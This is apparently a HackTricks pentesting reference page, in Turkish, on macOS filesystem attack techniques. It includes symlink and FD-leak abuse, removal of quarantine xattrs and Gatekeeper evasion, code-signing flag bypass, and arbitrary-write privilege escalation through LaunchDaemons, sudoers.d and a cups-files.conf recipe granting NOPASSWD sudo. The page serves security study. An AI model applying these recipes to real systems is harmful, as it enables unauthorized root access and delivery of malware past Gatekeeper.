# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

Bir **directory** için üç izin biti, normal bir dosyadakinden farklı bir anlama gelir. `chmod(1)`, bir directory'ye uygulandığında execute bit'ini "**search**" olarak adlandırır:<sup>[2]</sup>

> `0100` Dosyalar için owner tarafından çalıştırmaya izin verir. Directory'ler için owner'ın directory içinde **search** yapmasına izin verir.

- **read** - directory entry'lerini **enumerate** edebilirsiniz (isimleri listeleyebilirsiniz).
- **write** - directory içinde entry'leri **create, rename and delete** edebilirsiniz. Bunun *containing* directory'nin bir özelliği olduğunu, dosyanın değil, unutmayın: parent directory'sine write edebildiğiniz sürece, okuyamadığınız veya write edemediğiniz bir dosyayı delete edebilirsiniz.
- Bir **subdirectory**'yi delete etmek için boş olması gerekir; bu da içindeki her şeyi remove etmek için yeterli haklara sahip olmayı gerektirir.
- Directory'de (`/tmp` gibi) **sticky bit** (`S_ISVTX`) varsa bu kısıtlanır — POSIX'e göre bir process, yalnızca dosyanın owner'ıysa, directory'nin owner'ıysa veya uygun privileges'a sahipse bu directory içindeki dosyaları remove veya rename edebilir.<sup>[1]</sup>
- **execute / search** - directory'yi **traverse** etmenize izin verilir. Pathname resolution, her component'i "predecessor'ü tarafından belirtilen directory içinde" bulur; bu nedenle path prefix'in herhangi bir tek component'inde search haklarını kaybetmek, leaf file'ın kendisi world-readable olsa bile, path üzerinden altındaki her şeyi erişilemez hale getirir.<sup>[1]</sup>

### Dangerous Combinations

**root tarafından sahip olunan bir file/folder nasıl overwrite edilir**, ancak:

- Path içindeki bir parent **directory owner** user'dır
- Path içindeki bir parent **directory owner**, **write access**'e sahip bir **users group**'tur
- Bir users **group**, **file** üzerinde **write** access'e sahiptir

Önceki kombinasyonlardan herhangi biriyle attacker, privileged arbitrary write elde etmek için beklenen path'e bir **sym/hard link** **inject** edebilir.

### Folder root R+X special case

Bu, yukarıdaki pathname-resolution kuralının doğrudan bir sonucudur. Bir **directory** yalnızca root'a R+X veriyorsa, içindeki dosyalara diğer herkes için *path üzerinden* erişilemez — ancak **files'** kendi permission bit'leri yine de permissive olabilir. Aradaki tek engel directory'dir.

Dolayısıyla dosyayı bu directory'den **out** etmenizi sağlayan herhangi bir primitive — attacker'ın seçtiği bir path'i traverse edebildiğiniz bir konuma **moves/renames/copies** eden privileged bir process — dosyanın kendi mode'unu aşmaya hiç gerek kalmadan arbitrary read'e dönüşür:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Ayrıcalıklı file mover'ları (installer'lar, log rotator'ları, crash/diagnostic collector'lar, backup ve "export" özellikleri) arayın; bunlar daha düşük ayrıcalıklara sahip bir user'dan source path kabul eder.

## Symbolic Link / Hard Link

### İzinleri geniş file/folder

Ayrıcalıklı bir process, **lower privileged user** tarafından **kontrol edilebilen** veya daha önce **lower privileged user** tarafından **oluşturulmuş** bir **file** içine data yazıyorsa. User, bu file'ı bir Symbolic veya Hard link aracılığıyla **başka bir file'ı gösterecek** şekilde yönlendirebilir ve ayrıcalıklı process bu file'a yazabilir.

Bir attacker'ın **arbitrary write ile privileges escalate edebileceği** diğer bölümleri kontrol edin.

### Open `O_NOFOLLOW`

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) başına: *"`O_NOFOLLOW` mask içinde kullanılırsa ve `open()`'a geçirilen target file bir symbolic link ise `open()` başarısız olur."* Yalnızca **son** component kontrol edilir — her **intermediate** component yine de resolve edilir ve takip edilir. Bu nedenle `O_NOFOLLOW` ile write işlemini "koruyan" bir developer, target path'in herhangi bir **parent directory**'sine bir symlink yerleştirilerek hâlâ attack edilebilir.<sup>[3]</sup>

Aynı man page bu açığı gerçekten kapatan flag'leri belgeler:<sup>[3]</sup>

- **`O_NOFOLLOW_ANY`** — *"`open()`'a geçirilen path'in ... herhangi bir component'i symbolic link ise `open()` başarısız olur."*
- **`O_RESOLVE_BENEATH`** — *"`openat()`'a geçirilen ... belirtilen path resolution, fd ile ilişkilendirilmiş directory dışına çıkarsa başarısız olur."*

Aksi takdirde, daha önce doğruladığınız bir directory FD'ye göre relative `openat()` kullanmak veya `realpath()` + yeniden doğrulama yapmak, path'in ortasında gerçekleşen symlink swap'lerini durdurmanın kalan yollarıdır.

## .fileloc

**`.fileloc`** extension'ına sahip file'lar diğer application'lara veya binary'lere işaret edebilir; böylece açıldıklarında application/binary çalıştırılır.\
Örnek:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Dosya Tanımlayıcıları

### Leak FD (no `O_CLOEXEC`)

`open` çağrısında `O_CLOEXEC` flag'i yoksa dosya tanımlayıcısı child process tarafından devralınır. Bu nedenle privileged bir process privileged bir dosyayı açar ve attacker tarafından kontrol edilen bir process'i çalıştırırsa attacker, **privileged dosyaya ait FD'yi devralır**.

Kanonik örnek, **OS X 10.10'daki `DYLD_PRINT_TO_FILE` LPE**'dir ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[4]</sup>

- `dyld`, bu değişken `processDyldEnvironmentVariable()` dışında parse edildiği için **restricted (suid root) binary'lerde** bile `DYLD_PRINT_TO_FILE=/path` değerini kabul ediyordu.
- `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` çağrısını yaparak **herhangi bir path'te root sahipliğinde bir dosya oluşturuyordu**.
- FD **hiç kapatılmıyor ve close-on-exec flag'ine sahip olmuyordu**; bu nedenle suid binary'nin her child process'i **root sahipliğindeki bir dosyaya yazılabilir FD'yi devralıyordu**.
- Örneğin `DYLD_PRINT_TO_FILE=/etc/target suid_binary` çalıştırıp child process'te devralınan FD numarasını okumak, root sahipliğindeki dosyalara arbitrary write imkanı sağlıyordu; `fcntl(fd, F_SETFL, 0)` ile `O_APPEND` bile temizlenerek dosyanın sonuna eklemek yerine üzerine yazılması sağlanabiliyordu.

Aynı durum, privileged bir process `exec` ile kontrol ettiğiniz bir şeyi çalıştırmadan **önce** bir dosya açtığında da ortaya çıkar (helper tools, `$EDITOR` üzerinden çağrılan `crontab` tarzı editor'ler, env-var path'inden açılan log/debug dosyaları...). Devraldığınız FD'leri şu komutla listeleyin:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
`2` üzerindeki ve kendi başınıza açamayacağınız bir dosyaya işaret eden her şey, bir arbitrary-write (veya arbitrary-read) primitive'idir.

## quarantine xattrs hilelerinden kaçının

### Kaldırın
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Bir dosya/klasör bu immutable attribute'a sahipse, üzerine bir xattr eklemek mümkün olmaz.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### xattr desteği olmayan dosya sistemleri

macOS'un bağlayabildiği her dosya sistemi **extended attributes** özniteliklerini yerel olarak depolamaz. HFS+ ve APFS bunu destekler; **FAT32, exFAT ve (çoğu) NFS bağlaması desteklemez** — macOS bunları `._<filename>` adlı bir **AppleDouble** yan dosyasına yazarak taklit eder ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[5]</sup>

Bu durum quarantine için önemlidir; çünkü xattr yalnızca aynı volume üzerinden gerçekten yazılabiliyor **ve yeniden okunabiliyorsa** varlığını sürdürür:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Birim daha sonra `._` eşlikçi dosyasını yok sayan bir yol üzerinden okunursa (veya eşlikçi dosya kaldırılır/silinirse), dosya **quarantine flag olmadan** gelir — quarantine uygulanmamış bir `.app`, [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) bölümünde ele alındığı üzere App Sandbox'tan kaçmak için yeterlidir.

### writeextattr ACL

Bu ACL, dosyaya `xattrs` eklenmesini engeller.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** dosya formatı, bir dosyayı ACE'leri dahil olmak üzere kopyalar.

[**Kaynak kodunda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), **`com.apple.acl.text`** adlı xattr içinde depolanan ACL metin gösteriminin, sıkıştırılmış dosyada ACL olarak ayarlanacağını görmek mümkündür. Bu nedenle, diğer xattr'ların dosyaya yazılmasını engelleyen bir ACL ile bir uygulamayı **AppleDouble** dosya formatını kullanarak bir zip dosyasına sıkıştırırsanız... quarantine xattr'ı uygulamada ayarlanmaz:

Daha fazla bilgi için [**orijinal rapora**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) bakın.<sup>[6]</sup>

Bunu tekrarlamak için önce doğru ACL dizesini elde etmemiz gerekir:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Not that even if this works the sandbox write the quarantine xattr before)

Not really needed but I leave it there just in case:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass signature checks

### Bypass platform binaries checks

Bazı security kontrolleri, örneğin bir XPC service'e bağlanmaya izin vermek için binary'nin bir **platform binary** olup olmadığını kontrol eder. Ancak https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ adresinde açıklandığı üzere, bir platform binary'si (örneğin /bin/ls) edinip exploit'i `DYLD_INSERT_LIBRARIES` env variable'ı üzerinden dyld kullanarak inject ederek bu kontrolü bypass etmek mümkündür.<sup>[7]</sup>

### Bypass flags `CS_REQUIRE_LV` and `CS_FORCED_LV`

Çalışan bir binary'nin, aşağıdaki gibi bir code kullanarak kontrolleri bypass etmek için kendi flags'lerini değiştirmesi mümkündür:<sup>[7]</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Code Signatures Bypass

Paketler, **bundle** içindeki her bir **file**'ın **hash** değerini içeren **`_CodeSignature/CodeResources`** dosyasını barındırır. CodeResources'ın hash değerinin de **executable** içine **embedded** edildiğini unutmayın; bu nedenle onunla da oynayamayız.

Ancak bazı file'ların signature'ı kontrol edilmez; bunlarda plist içinde `omit` anahtarı bulunur, örneğin:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Bir kaynağın imzasını CLI üzerinden hesaplamak mümkündür:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## DMG'leri Mount Etme

Bir kullanıcı, oluşturduğu özel bir dmg'yi bazı mevcut klasörlerin üzerine bile mount edebilir. Özel içerik barındıran özel bir dmg paketi şu şekilde oluşturulabilir:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Genellikle macOS, `/usr/libexec/diskarbitrationd` tarafından sağlanan `com.apple.DiskArbitrarion.diskarbitrariond` Mach service ile iletişim kurarak diskleri mount eder. LaunchDaemons plist dosyasına `-d` parametresi eklenir ve servis yeniden başlatılırsa günlükleri `/var/log/diskarbitrationd.log` dosyasına kaydeder.\
Bununla birlikte, `com.apple.driver.DiskImages` kext ile doğrudan iletişim kurmak için `hdik` ve `hdiutil` gibi araçları kullanmak mümkündür.

## Arbitrary Writes

### Periodic sh scripts

Script'iniz **shell script** olarak yorumlanabiliyorsa her gün tetiklenecek olan **`/etc/periodic/daily/999.local`** shell script'inin üzerine yazabilirsiniz.

Bu script'in çalıştırılmasını şu komutla **taklit edebilirsiniz**: **`sudo periodic daily`**

### Daemons

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** gibi bir **LaunchDaemon** yazın ve plist içinde aşağıdakine benzer şekilde arbitrary bir script çalıştırın:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Yalnızca root olarak çalıştırmak istediğiniz **komutları** içeren `/Applications/Scripts/privesc.sh` scriptini oluşturun.

### Sudoers File

**arbitrary write** yetkiniz varsa, kendinize **sudo** privileges veren bir dosyayı **`/etc/sudoers.d/`** klasörü içinde oluşturabilirsiniz.

### PATH files

**`/etc/paths`** dosyası, PATH env variable'ını oluşturan ana konumlardan biridir. Üzerine yazmak için root olmanız gerekir; ancak **privileged process** tarafından çalıştırılan bir script, bazı **komutları tam path olmadan** çalıştırıyorsa, bu dosyayı değiştirerek onu **hijack** edebilirsiniz.

Ayrıca PATH env variable'ına yeni klasörler yüklemek için **`/etc/paths.d`** içine dosyalar yazabilirsiniz.

### cups-files.conf

Bu teknik [this writeup](https://www.kandji.io/blog/macos-audit-story-part1) içinde kullanılmıştır.<sup>[8]</sup>

Aşağıdaki içeriğe sahip `/etc/cups/cups-files.conf` dosyasını oluşturun:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Bu, `/etc/sudoers.d/lpe` dosyasını 777 izinleriyle oluşturur. Sondaki ekstra gereksiz içerik, hata logunun oluşturulmasını tetiklemek içindir.

Ardından, `/etc/sudoers.d/lpe` dosyasına `%staff ALL=(ALL) NOPASSWD:ALL` gibi ayrıcalıkları yükseltmek için gereken yapılandırmayı yazın.

Daha sonra `/etc/cups/cups-files.conf` dosyasını tekrar değiştirerek `LogFilePerm 700` belirtin; böylece yeni sudoers dosyası `cupsctl` çağrıldığında geçerli hale gelir.

### Sandbox Escape

FS arbitrary write kullanarak macOS sandbox'tan kaçmak mümkündür. Bazı örnekler için [macOS Auto Start](../../../../macos-auto-start-locations.md) sayfasına bakabilirsiniz; ancak yaygın bir yöntem, başlangıçta bir komut çalıştıran Terminal preferences dosyasını `~/Library/Preferences/com.apple.Terminal.plist` konumuna yazmak ve bu dosyayı `open` kullanarak çağırmaktır.

## Diğer kullanıcılar olarak writable files oluşturma

Çok yaygın bir privesc primitive, **ayrıcalıklı bir sürecin sizin için** kontrol ettiğiniz bir dizinde bir dosya oluşturmasını sağlamak ve ardından bu dosyaya **write access** sağlamaya devam etmektir. Bunun için iki bileşen gerekir:

1. Sahip olduğunuz (veya **inheritable ACL** ayarlayabildiğiniz) bir dizin; böylece içinde oluşturulan her şey izinlerinizi devralır.
2. Dosyanın **nerede** oluşturulacağını belirlemesi sağlanabilen ayrıcalıklı bir/`suid` süreci — genellikle bir debug/logging environment variable, config file veya bir helper'ın XPC API'si aracılığıyla.

**Inheritable ACL** bölümü, oluşturulan dosyanın başka bir kullanıcıya ait olmasına rağmen sizin tarafınızdan writable olmasını sağlar. `file_inherit` / `directory_inherit` inheritance flags, [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) içinde belgelenmiştir:
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Artık ayrıcalıklı bir process'in `$DIRNAME` içinde oluşturduğu herhangi bir dosya **sizin tarafınızdan yazılabilir**. Bu dizin aynı zamanda daha sonra **root olarak çalıştırılan** bir konumsa (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, bir LaunchDaemon dizini...), bu doğrudan root escalation sağlar. Dosyayı elde ettikten sonra ne yazmanız gerektiği için yukarıdaki [Sudoers File](#sudoers-file) ve [cups-files.conf](#cups-filesconf) bölümlerine bakın.

"env variable bir root process'inin dosya oluşturmasını sağlar ve FD size leak olur" zincirinin tam ve uygulamalı bir örneği için yukarıdaki [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) bölümüne bakın.

## POSIX Shared Memory

**POSIX shared memory**, POSIX uyumlu işletim sistemlerindeki process'lerin ortak bir bellek alanına erişmesini sağlayarak diğer inter-process communication yöntemlerine kıyasla daha hızlı iletişim kurulmasına olanak tanır. Bu işlem, `shm_open()` ile bir shared memory object oluşturmayı veya açmayı, `ftruncate()` ile boyutunu ayarlamayı ve `mmap()` kullanarak process'in address space'ine map etmeyi içerir. Process'ler daha sonra bu bellek alanını doğrudan okuyabilir ve buraya yazabilir. Eşzamanlı erişimi yönetmek ve data corruption'ı önlemek için genellikle mutex veya semaphore gibi synchronization mekanizmaları kullanılır. Son olarak process'ler, shared memory'yi `munmap()` ve `close()` ile unmap edip kapatır ve isteğe bağlı olarak memory object'i `shm_unlink()` ile kaldırır. Bu sistem, birden fazla process'in shared data'ya hızlı ve verimli şekilde erişmesi gereken ortamlarda etkili bir IPC yöntemidir.

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Tüketici Kod Örneği</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors**, user uygulamalarındaki **file descriptor operations** güvenliğini ve güvenilirliğini artırmak için macOS'ta kullanıma sunulan bir security feature'dır. Bu guarded descriptors, file descriptor'larla belirli kısıtlamaları veya kernel tarafından uygulanan "guards" kurallarını ilişkilendirmek için bir yöntem sağlar.

Bu feature, **unauthorized file access** veya **race conditions** gibi belirli security vulnerability sınıflarını önlemek için özellikle kullanışlıdır. Bu vulnerabilities, örneğin bir thread'in bir file description'a erişerek **başka bir vulnerable thread'e erişim sağlaması** veya bir file descriptor'ın **vulnerable child process** tarafından **inherit edilmesi** durumunda ortaya çıkar. Bu işlevle ilgili bazı functions şunlardır:

- `guarded_open_np`: Guard ile bir FD açar
- `guarded_close_np`: Kapatır
- `change_fdguard_np`: Bir descriptor üzerindeki guard flags'i değiştirir (guard protection'ı kaldırmak dahil)

## References

- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (close-on-exec olmadan leak edilmiş FD)
- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
